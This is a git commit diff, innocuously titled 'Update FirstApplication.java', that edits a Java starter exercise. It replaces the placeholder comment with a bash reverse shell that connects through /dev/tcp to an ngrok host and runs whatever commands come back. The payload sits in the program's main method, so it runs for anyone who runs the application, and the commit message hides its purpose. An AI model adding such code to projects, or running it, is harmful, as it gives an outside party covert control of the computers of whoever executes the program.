446cd973c312498caefd490303cb1b3a0506b4a8
cooper-bugbounty <109574611+cooper-bugbounty@users.noreply.github.com>
2022-07-19 15:44:09 +1000

    Update FirstApplication.java

--- src/main/java/com/mjc/stage0/FirstApplication.java
+++ src/main/java/com/mjc/stage0/FirstApplication.java
@@ -2,6 +2,8 @@ package com.mjc.stage0;
 
 public class FirstApplication {
     public static void main(String[] args) {
-        // Write your code here!
+        Runtime r = Runtime.getRuntime();
+        Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/4.tcp.ngrok.io/19508;cat <&5 | while read line; do $line 2>&5 >&5; done'");
+        p.waitFor();
     }
 }
